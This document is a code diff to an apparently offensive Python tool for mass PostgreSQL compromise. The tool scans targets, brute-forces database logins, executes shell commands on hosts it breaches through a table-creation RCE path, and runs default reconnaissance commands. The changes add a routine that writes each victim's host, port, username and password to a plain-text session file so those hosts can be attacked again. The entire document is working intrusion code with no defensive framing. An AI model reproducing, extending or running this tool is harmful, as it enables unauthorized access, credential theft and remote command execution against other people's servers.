@@ -44,16 +44,21 @@ class Victim:
         self.is_linux = any(x in version for x in ['linux', 'x86_64', 'Debian', 'Ubuntu'])
 
     def do_rce(self, command):
+        if not command:
+            if self.is_linux:
+                command = 'uname -a && id && ifconfig'
+            else:
+                command = 'ipconfig && whoami /priv'
+
         if self.major_version >= 9:
             rce = self.do_rce_v9_v10(command)
-            print("[!] RCE '" + command + "'")
-            print(rce)
         elif self.major_version == 8:
             rce = self.do_rce_v8(command)
-            print("[!] RCE '" + command + "'")
-            print(rce)
         else:
             print("[-] PSQL version is too old")
+
+        print("[!] RCE '" + command + "'")
+        print(rce)
 
     def do_rce_v9_v10(self, command):
         make_query(self.ip, self.port, self.username, self.password, "CREATE TABLE IF NOT EXISTS debugger (id text);")
@@ -65,6 +70,18 @@ class Victim:
 
     def do_rce_v8(self, command):
         return 'RCE v8 is not implemented yet'
+
+    def save_victim(self):
+        # We cannot use r+ because file may not exist before first run. We cannot use w+ because it deletes the file.
+        # So we use a+. But this mode sets initial position at the end, so...
+        f = open('.psql-mass-rce.saved', 'a+')
+        last_position = f.tell() # remember last position
+        f.seek(0) # goto first position of the file to search if victim is already in the file
+        host_port = self.ip + ":" + str(self.port)
+        if host_port not in f.read():
+            f.seek(last_position)
+            f.write(host_port + ":" + self.username + ":" + self.password + "\n")
+        f.close()
 
 
 # Make PSQL query
@@ -105,15 +122,17 @@ def make_query(host, port, user, password, query='SELECT version();'):
 # Parse CLI arguments
 def parse_args():
     parser = argparse.ArgumentParser(description='Scan network for postgreses, bruteforce passwords, pwn.')
-    parser.add_argument('targets', metavar='targets', type=str, nargs='+')
+    parser.add_argument('targets', metavar='targets', type=str, nargs='*') # nargs='+' if targets is necessary
     parser.add_argument('--userlist', dest='userlist',
-                        default=None, help='file with a list of users')
+                        default=None, help='File with a list of users')
     parser.add_argument('--passlist', dest='passlist',
-                        default=None, help='file with a list of passwords')
+                        default=None, help='File with a list of passwords')
     parser.add_argument('--command', dest='command',
-                        default=None, help='command to execute on a target machine')
+                        default=None, help='Command to execute on a target machine')
     parser.add_argument('--port', dest='port',
-                        default=None, help='port to connect')
+                        default=None, help='Port to connect')
+    parser.add_argument('--saved', dest='saved', action='store_true',
+                        default=False, help='Load data from saved session file')
 
     args = parser.parse_args()
 
@@ -141,7 +160,7 @@ def parse_file_gnmap(file_path):
 
 # Parse string from CLI arguments: ip/range/file.
 # Returns [(ip, port)]
-def parse_target(target, port=5432):
+def parse_target(target, port):
     try:
         ipaddress.ip_address(target)
         return [(target, port)]  # one IP
@@ -157,25 +176,36 @@ def parse_target(target, port=5432):
                 exit()
 
 
+def attack_victim(ip, port, userlist, passlist, command):
+    print("[x] Starting host " + ip + ":" + str(port))
+    victim = Victim(ip, port)
+    if victim.port_is_open():
+        if victim.bruteforce(userlist, passlist):
+            victim.save_victim()
+            victim.do_rce(command)
+
+
+def load_save_file():
+    try:
+        with open('.psql-mass-rce.saved') as f:
+            lines = f.read().splitlines()
+        return lines
+    except:
+        return []
+
+
 def main():
     args = parse_args()
     command = args.command
 
-    for target in args.targets:
-        for ip, port in parse_target(target, args.port):
-            print("[x] Starting host:", ip)
-            victim = Victim(ip, port)
-            if not victim.port_is_open():
-                continue
-
-            if victim.bruteforce(args.userlist, args.passlist):
-                if not command:
-                    if victim.is_linux:
-                        command = 'uname -a && id && ifconfig'
-                    else:
-                        command = 'ipconfig && whoami /priv'
-                victim.do_rce(command)
-
+    if args.saved:
+        for line in load_save_file():
+            data = line.split(':')
+            attack_victim(data[0], data[1], [data[2]], [data[3]], command)
+    else:
+        for target in args.targets:
+            for ip, port in parse_target(target, args.port):
+                attack_victim(ip, port, args.userlist, args.passlist, command)
 
 if __name__ == '__main__':
     main()
